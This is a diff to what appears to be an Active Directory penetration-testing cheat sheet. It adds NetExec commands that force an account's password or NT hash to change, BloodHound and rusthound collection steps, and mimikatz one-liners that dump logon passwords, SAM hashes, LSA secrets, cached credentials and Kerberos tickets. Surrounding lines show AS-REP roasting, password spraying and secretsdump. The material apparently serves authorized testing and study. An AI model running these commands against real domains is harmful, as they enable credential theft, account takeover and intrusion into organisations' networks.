@@ -61,6 +61,9 @@ If no creds yet, the DC is rarely the first box — pivot from a workstation/web
 nxc smb <DC_IP> -u <user> -p '<pass>'
 nxc smb <DC_IP> -u <user> -H <NTLM_hash>
 
+nxc smb <ip> -u user -p pass -M change-password -o NEWPASS=NewPassword
+nxc smb <ip> -u user -p pass -M change-password -o NEWNTHASH=31d6cfe0d16ae931b73c59d7e0c089c0
+
 # AS-REP Roasting — no creds needed if you have a valid username list
 GetNPUsers.py <domain.local>/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
 # or authenticated, dump all UF_DONT_REQUIRE_PREAUTH accounts
@@ -80,6 +83,13 @@ nxc smb <DC_IP> -u users.txt -p 'Season2026!' --continue-on-success
 ```bash
 # Full domain enum with BloodHound collector
 bloodhound-python -u <user> -p '<pass>' -d <domain.local> -ns <DC_IP> -c All --zip
+
+# rusthound-ce
+rusthound-ce --domain <domain> -u <user> -p <password> -z
+
+# bloodhound-ce
+cd .config/bloodhound
+docker-compose up -d
 
 # nxc one-liners for quick wins
 nxc smb <DC_IP> -u <user> -p '<pass>' --users
@@ -212,6 +222,10 @@ secretsdump.py <domain.local>/<user>:'<pass>'@<target>
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::tickets /export
+
+.\mimikatz.exe "privilege::debug" "token::elevate" "log" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "sekurlsa::tickets" "exit"
+
+mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"
 
 # gMSA passwords (if ReadGMSAPassword right held)
 gMSADumper.py -u <user> -p '<pass>' -d <domain.local>
